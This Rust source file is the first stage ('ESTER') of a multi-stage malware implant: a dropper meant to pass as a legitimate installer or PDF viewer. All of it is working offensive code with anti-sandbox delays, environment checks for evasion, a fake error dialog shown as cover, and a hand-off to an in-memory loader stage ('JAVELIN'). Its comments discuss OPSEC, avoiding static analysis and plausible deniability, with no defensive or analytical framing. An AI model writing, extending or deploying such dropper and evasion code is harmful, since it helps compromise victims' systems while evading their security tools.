//! Stage 1: ESTER - Minimal Dropper/Installer Wrapper
//!
//! **Purpose**: Acts as the initial entry point with legitimate execution flow preservation.
//!
//! **Why this stage exists**:
//! - Provides a legitimate-looking wrapper that can pass initial inspection
//! - Performs minimal environment checks before triggering next stage
//! - Preserves plausible deniability (e.g., pretends to be a legitimate installer)
//! - NO direct C2 logic - only responsible for staging
//!
//! **OPSEC Considerations**:
//! - Runs on disk (unavoidable as initial entry point)
//! - Should appear as legitimate software (PDF viewer, installer, etc.)
//! - Minimal suspicious behavior to avoid triggering static analysis
//! - Only proceeds to Stage 2 if environment checks pass
//!
//! **Separation of Responsibilities**:
//! - ESTER does NOT connect to C2
//! - ESTER does NOT execute payloads directly
//! - ESTER only validates environment and triggers JAVELIN (Stage 2)

// Conditional windows subsystem: console for dev, windows (no console) for production
#![cfg_attr(feature = "production", windows_subsystem = "windows")]
#![cfg_attr(not(feature = "production"), windows_subsystem = "console")]

mod config;
mod evasion;
mod stage_trigger;

use std::thread;
use std::time::Duration;

// Macro for conditional debug printing (production mode compiles to nothing)
#[macro_export]
macro_rules! debug_print {
    ($($arg:tt)*) => {
        #[cfg(feature = "dev")]
        {
            println!($($arg)*);
        }
    };
}

fn main() {
    debug_print!("[ESTER] Stage 1 initializing...");

    // Step 1: Initial delay to evade sandbox time acceleration
    // Sandboxes often accelerate time to speed up analysis
    // This delay appears natural and helps identify sandbox environments
    debug_print!("[ESTER] Applying anti-sandbox delay (3s)...");
    thread::sleep(Duration::from_secs(3));

    // Step 2: Environment validation checks
    // Only proceed if the environment appears to be a real system
    debug_print!("[ESTER] Performing environment checks...");
    if !evasion::validate_environment() {
        debug_print!("[ESTER] Environment checks failed - aborting");
        // Exit gracefully without suspicious behavior
        show_fake_error();
        return;
    }
    debug_print!("[ESTER] Environment checks passed");

    // Step 3: Optional - Show legitimate behavior
    // This could open a decoy document, show a fake installer UI, etc.
    // For now, we just add another human-like delay
    let delay = evasion::get_random_delay(1000, 3000);
    debug_print!("[ESTER] Human-like delay: {}ms", delay);
    thread::sleep(Duration::from_millis(delay));

    // Step 4: Trigger Stage 2 (JAVELIN) - The in-memory loader
    // This is where we hand off control to the next stage
    debug_print!("[ESTER] Triggering Stage 2 (JAVELIN)...");
    match stage_trigger::trigger_javelin() {
        Ok(thread_handle) => {
            debug_print!("[ESTER] Stage 2 triggered successfully");
            
            // CRITICAL: We must wait for the JAVELIN thread to complete
            // If ESTER exits, the thread dies with it!
            // In production mode, wait indefinitely for JAVELIN to finish
            // (which means waiting for the entire agent lifecycle)
            #[cfg(target_os = "windows")]
            {
                use winapi::um::synchapi::WaitForSingleObject;
                use winapi::um::winbase::INFINITE;
                
                if !thread_handle.is_null() {
                    debug_print!("[ESTER] Waiting for JAVELIN thread to complete...");
                    unsafe {
                        WaitForSingleObject(thread_handle, INFINITE);
                    }
                }
            }
        }
        Err(e) => {
            debug_print!("[ESTER] Failed to trigger Stage 2: {:?}", e);
            // Fail silently in production mode
            #[cfg(feature = "dev")]
            eprintln!("Error: {:?}", e);
        }
    }

    debug_print!("[ESTER] Stage 1 complete");
    
    // In dev mode, wait for user input so we can see the output
    #[cfg(feature = "dev")]
    {
        println!("\n[DEBUG] Press Enter to exit...");
        let mut input = String::new();
        let _ = std::io::stdin().read_line(&mut input);
    }
}

/// Shows a fake error message to maintain cover
/// In production, this makes ESTER look like a broken/corrupted file
fn show_fake_error() {
    #[cfg(all(target_os = "windows", feature = "production"))]
    {
        use std::ptr;
        use winapi::um::winuser::{MessageBoxW, MB_ICONERROR, MB_OK};

        let title: Vec<u16> = "Error\0".encode_utf16().collect();
        let message: Vec<u16> = "The application failed to initialize properly. Please contact the vendor.\0"
            .encode_utf16()
            .collect();

        unsafe {
            MessageBoxW(
                ptr::null_mut(),
                message.as_ptr(),
                title.as_ptr(),
                MB_OK | MB_ICONERROR,
            );
        }
    }

    #[cfg(not(feature = "production"))]
    {
        eprintln!("ERROR: Application initialization failed");
    }
}
